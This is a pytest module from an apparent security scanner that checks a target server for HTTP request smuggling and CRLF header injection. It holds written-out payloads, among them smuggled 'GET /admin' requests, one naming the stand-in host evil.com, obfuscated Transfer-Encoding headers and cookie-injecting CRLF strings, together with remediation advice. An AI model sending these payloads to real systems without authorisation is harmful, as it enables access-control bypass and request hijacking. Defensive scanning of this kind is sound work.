"""
HTTP Request Smuggling Tests

Tests for HTTP request smuggling attacks including:
- CL.TE attacks
- TE.CL attacks
- Double Content-Length
- Obfuscated headers
- CRLF injection
"""

import time

import pytest

from utils.scanner import SecurityScanner, Finding, Severity

# Request smuggling payloads
CL_TE_PAYLOADS = [
    {
        "headers": {"Content-Length": "50", "Transfer-Encoding": "chunked"},
        "body": "0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n",
        "desc": "Basic CL.TE smuggling"
    },
    {
        "headers": {"Content-Length": "6", "Transfer-Encoding": "chunked"},
        "body": "0\r\n\r\nG",
        "desc": "CL.TE prefix smuggle"
    },
]

TE_CL_PAYLOADS = [
    {
        "headers": {"Transfer-Encoding": "chunked", "Content-Length": "10"},
        "body": "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n",
        "desc": "Basic TE.CL smuggling"
    },
]

TE_OBFUSCATION_PAYLOADS = [
    {"Transfer-Encoding": "chunked"},
    {"Transfer-Encoding": " chunked"},
    {"Transfer-Encoding": "chunked "},
    {"Transfer-Encoding": "\tchunked"},
    {"Transfer-Encoding": "chunked\t"},
    {"Transfer-Encoding": "xchunked"},
    {"Transfer-encoding": "chunked"},
    {"TRANSFER-ENCODING": "chunked"},
    {"Transfer-Encoding": "chunked\r\nTransfer-Encoding: x"},
]


@pytest.fixture
def smuggling_scanner(test_config):
    """Create scanner for request smuggling tests."""
    return SecurityScanner(test_config)


class TestHTTPRequestSmuggling:
    """HTTP request smuggling test suite."""

    @pytest.mark.security
    @pytest.mark.request_smuggling
    @pytest.mark.slow
    def test_cl_te_smuggling(self, smuggling_scanner, target_url, findings_collector, test_config):
        """Test for CL.TE (Content-Length, Transfer-Encoding) smuggling."""
        if test_config.intensity == "light":
            pytest.skip("Request smuggling test skipped in light intensity mode")

        test_paths = ["/", "/api/", "/proxy/"]

        for path in test_paths[:2]:
            base_url = f"{target_url}{path}"

            for payload_info in CL_TE_PAYLOADS:
                try:
                    headers = payload_info["headers"].copy()
                    body = payload_info["body"]

                    resp = smuggling_scanner.post(base_url, data=body, headers=headers, timeout=10)

                    if resp:
                        text = resp.text.lower()

                        if "/admin" in text or "forbidden" in text or "200 ok" in text:
                            finding = Finding(
                                title="HTTP Request Smuggling (CL.TE)",
                                severity=Severity.HIGH,
                                description=f"CL.TE smuggling - {payload_info['desc']}",
                                url=base_url,
                                evidence="Transfer-Encoding: chunked with smuggled request",
                                remediation="Upgrade web server to latest version. Normalize HTTP headers. Reject ambiguous requests.",
                                cwe_id="CWE-444",
                                owasp_category="A01:2021 - Broken Access Control",
                            )
                            findings_collector.add(finding)
                            smuggling_scanner.add_finding(finding)
                            return
                except Exception:
                    pass

    @pytest.mark.security
    @pytest.mark.request_smuggling
    @pytest.mark.slow
    def test_te_cl_smuggling(self, smuggling_scanner, target_url, findings_collector, test_config):
        """Test for TE.CL (Transfer-Encoding, Content-Length) smuggling."""
        if test_config.intensity == "light":
            pytest.skip("Request smuggling test skipped in light intensity mode")

        test_paths = ["/", "/api/"]

        for path in test_paths[:2]:
            base_url = f"{target_url}{path}"

            for payload_info in TE_CL_PAYLOADS:
                try:
                    headers = payload_info["headers"].copy()
                    body = payload_info["body"]

                    resp = smuggling_scanner.post(base_url, data=body, headers=headers, timeout=10)

                    if resp:
                        text = resp.text.lower()

                        if "/admin" in text or "evil.com" in text or "200 ok" in text:
                            finding = Finding(
                                title="HTTP Request Smuggling (TE.CL)",
                                severity=Severity.HIGH,
                                description=f"TE.CL smuggling - {payload_info['desc']}",
                                url=base_url,
                                evidence="Content-Length with Transfer-Encoding: chunked",
                                remediation="Normalize HTTP request parsing. Reject requests with conflicting headers.",
                                cwe_id="CWE-444",
                                owasp_category="A01:2021 - Broken Access Control",
                            )
                            findings_collector.add(finding)
                            smuggling_scanner.add_finding(finding)
                            return
                except Exception:
                    pass

    @pytest.mark.security
    @pytest.mark.request_smuggling
    def test_te_header_obfuscation(self, smuggling_scanner, target_url, findings_collector):
        """Test for Transfer-Encoding header obfuscation."""
        test_paths = ["/", "/api/"]

        for path in test_paths[:2]:
            base_url = f"{target_url}{path}"

            for te_header in TE_OBFUSCATION_PAYLOADS:
                try:
                    headers = te_header.copy()
                    headers["Content-Length"] = "5"
                    body = "0\r\n\r\n"

                    resp = smuggling_scanner.post(base_url, data=body, headers=headers, timeout=5)

                    if resp and resp.status_code == 200:
                        # Check if server processed the obfuscated TE header
                        finding = Finding(
                            title="Transfer-Encoding Obfuscation Accepted",
                            severity=Severity.MEDIUM,
                            description=f"Server accepts obfuscated TE header: {te_header}",
                            url=base_url,
                            evidence=f"TE header: {te_header}",
                            remediation="Normalize Transfer-Encoding headers. Reject malformed headers.",
                            cwe_id="CWE-444",
                            owasp_category="A05:2021 - Security Misconfiguration",
                        )
                        findings_collector.add(finding)
                        smuggling_scanner.add_finding(finding)
                        return
                except Exception:
                    pass

    @pytest.mark.security
    @pytest.mark.request_smuggling
    def test_crlf_response_splitting(self, smuggling_scanner, target_url, findings_collector):
        """Test for CRLF-based response splitting."""
        test_paths = ["/", "/api/"]

        crlf_payloads = [
            "%0D%0A",
            "%0d%0a",
            "\r\n",
            "%0D%0ASet-Cookie:%20evil=value",
            "%0D%0AX-Injected:%20true",
        ]

        for path in test_paths[:2]:
            base_url = f"{target_url}{path}"

            for crlf in crlf_payloads:
                try:
                    test_url = f"{base_url}?test=smuggling{crlf}"

                    resp = smuggling_scanner.get(test_url)

                    if resp and resp.status_code == 200:
                        # Check if CRLF was processed
                        headers_str = str(resp.headers).lower()
                        if "x-injected" in headers_str or "evil=value" in headers_str:
                            finding = Finding(
                                title="CRLF Response Splitting",
                                severity=Severity.HIGH,
                                description="CRLF injection allows header injection",
                                url=test_url,
                                evidence=f"CRLF payload: {crlf}",
                                remediation="Sanitize input to remove CRLF characters. Normalize HTTP headers.",
                                cwe_id="CWE-93",
                                owasp_category="A01:2021 - Broken Access Control",
                            )
                            findings_collector.add(finding)
                            smuggling_scanner.add_finding(finding)
                            return
                except Exception:
                    pass

    @pytest.mark.security
    @pytest.mark.request_smuggling
    def test_header_space_obfuscation(self, smuggling_scanner, target_url, findings_collector):
        """Test for space-based header obfuscation."""
        test_paths = ["/", "/api/"]

        space_headers = [
            {"Content-Length ": "50"},  # Trailing space
            {" Content-Length": "50"},  # Leading space
            {"Content-Length\t": "50"},  # Tab
            {"Content- Length": "50"},  # Space in name
        ]

        for path in test_paths[:2]:
            base_url = f"{target_url}{path}"

            for headers in space_headers:
                try:
                    body = "test"

                    resp = smuggling_scanner.post(base_url, data=body, headers=headers)

                    if resp and resp.status_code in [200, 400]:
                        finding = Finding(
                            title="Header Space Obfuscation",
                            severity=Severity.LOW,
                            description=f"Malformed header processed: {headers}",
                            url=base_url,
                            evidence=f"Header with space: {headers}",
                            remediation="Normalize HTTP headers. Reject malformed headers.",
                            cwe_id="CWE-444",
                            owasp_category="A05:2021 - Security Misconfiguration",
                        )
                        findings_collector.add(finding)
                        smuggling_scanner.add_finding(finding)
                        return
                except Exception:
                    pass

    @pytest.mark.security
    @pytest.mark.request_smuggling
    def test_timing_based_smuggling(self, smuggling_scanner, target_url, findings_collector, test_config):
        """Test for timing-based request smuggling detection."""
        if test_config.intensity == "light":
            pytest.skip("Timing test skipped in light intensity mode")

        base_url = f"{target_url}/"

        try:
            # Normal request timing
            start = time.time()
            normal_resp = smuggling_scanner.get(base_url, timeout=5)
            normal_time = time.time() - start

            # Smuggling attempt with delay
            headers = {
                "Content-Length": "100",
                "Transfer-Encoding": "chunked"
            }
            body = "0\r\n\r\n"

            start = time.time()
            smuggle_resp = smuggling_scanner.post(base_url, data=body, headers=headers, timeout=10)
            smuggle_time = time.time() - start

            # If smuggling request takes significantly longer, may indicate desync
            if smuggle_time > normal_time * 3 and smuggle_time > 2:
                finding = Finding(
                    title="Potential Request Smuggling (Timing)",
                    severity=Severity.MEDIUM,
                    description=f"Timing anomaly detected - normal: {normal_time:.2f}s, smuggle: {smuggle_time:.2f}s",
                    url=base_url,
                    evidence=f"Response time difference indicates potential desync",
                    remediation="Investigate server request handling. Check for request smuggling vulnerabilities.",
                    cwe_id="CWE-444",
                    owasp_category="A05:2021 - Security Misconfiguration",
                )
                findings_collector.add(finding)
                smuggling_scanner.add_finding(finding)
        except Exception:
            pass

    @pytest.mark.security
    @pytest.mark.request_smuggling
    def test_h2_downgrade_smuggling(self, smuggling_scanner, target_url, findings_collector):
        """Test for HTTP/2 to HTTP/1.1 downgrade smuggling."""
        base_url = f"{target_url}/"

        # Headers that might cause issues in H2->H1 translation
        h2_headers = [
            {"Transfer-Encoding": "chunked", ":method": "POST"},
            {"Content-Length": "0", "Content-Length": "10"},
        ]

        for headers in h2_headers:
            try:
                # Note: This is a simplified test - real H2 smuggling requires HTTP/2 client
                clean_headers = {k: v for k, v in headers.items() if not k.startswith(":")}

                resp = smuggling_scanner.post(base_url, data="test", headers=clean_headers)

                if resp and resp.status_code in [200, 400]:
                    # Log potential H2 downgrade issues
                    pass
            except Exception:
                pass

    @pytest.mark.security
    @pytest.mark.request_smuggling
    def test_websocket_smuggling(self, smuggling_scanner, target_url, findings_collector):
        """Test for WebSocket upgrade smuggling."""
        ws_paths = ["/ws", "/socket", "/websocket"]

        for path in ws_paths[:2]:
            url = f"{target_url}{path}"

            try:
                headers = {
                    "Upgrade": "websocket",
                    "Connection": "Upgrade",
                    "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                    "Sec-WebSocket-Version": "13",
                    "Content-Length": "100",
                }

                body = "GET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n"

                resp = smuggling_scanner.get(url, headers=headers)

                if resp and resp.status_code == 101:
                    # WebSocket upgrade accepted - check for smuggling
                    finding = Finding(
                        title="WebSocket Upgrade Smuggling Potential",
                        severity=Severity.MEDIUM,
                        description="WebSocket upgrade accepted with potential smuggling headers",
                        url=url,
                        evidence="Status 101 with Content-Length header",
                        remediation="Validate WebSocket upgrade requests. Reject requests with conflicting headers.",
                        cwe_id="CWE-444",
                        owasp_category="A05:2021 - Security Misconfiguration",
                    )
                    findings_collector.add(finding)
                    smuggling_scanner.add_finding(finding)
                    return
            except Exception:
                pass
